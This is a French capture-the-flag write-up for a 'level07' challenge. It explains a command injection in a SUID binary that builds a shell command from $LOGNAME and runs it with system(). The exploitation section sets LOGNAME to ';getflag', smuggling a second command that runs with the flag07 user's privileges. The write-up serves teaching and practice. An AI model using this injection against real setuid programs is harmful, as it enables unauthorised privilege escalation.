# Level07 — Command Injection via variable d'environnement (SUID + `system`)

## Fichier fourni

```sh
ls -la ~
# -rwsr-sr-x 1 flag07 level07 ... level07
```

SUID + SGID `flag07` — le binaire s'exécute avec l'UID et le GID de `flag07`.

## Reconnaissance

```sh
strings ./level07
```

Révèle deux strings clés : un nom de variable d'environnement et un format de commande shell.

```sh
ltrace ./level07
```

Sortie :

```
getenv("LOGNAME")                    = "level07"
asprintf(buf, FORMAT, "level07")
system("/bin/echo level07")
```

Le binaire :
1. Lit `$LOGNAME` via `getenv`
2. Construit une commande shell avec `asprintf` (format : `"/bin/echo %s"`)
3. Exécute la commande avec `system()`

`$LOGNAME` est contrôlé par l'utilisateur → **command injection directe**.

## Vulnérabilité

`system()` passe la chaîne à `/bin/sh -c`. Si `LOGNAME` contient `;getflag`, la commande devient `/bin/echo ;getflag` — le shell interprète `;` comme un séparateur et exécute `getflag` comme commande indépendante, avec l'UID de `flag07`.

Le `setresuid(geteuid(), geteuid(), geteuid())` en début de `main` fixe les 3 UID à `flag07` avant l'appel à `system()` — nécessaire car bash droppe les privilèges SUID si `ruid != euid`.

## Exploitation

```sh
export LOGNAME=";getflag"
./level07
```

Sortie :

```
Check flag.Here is your token : <TOKEN>
```

## Token

Voir `../flag`.
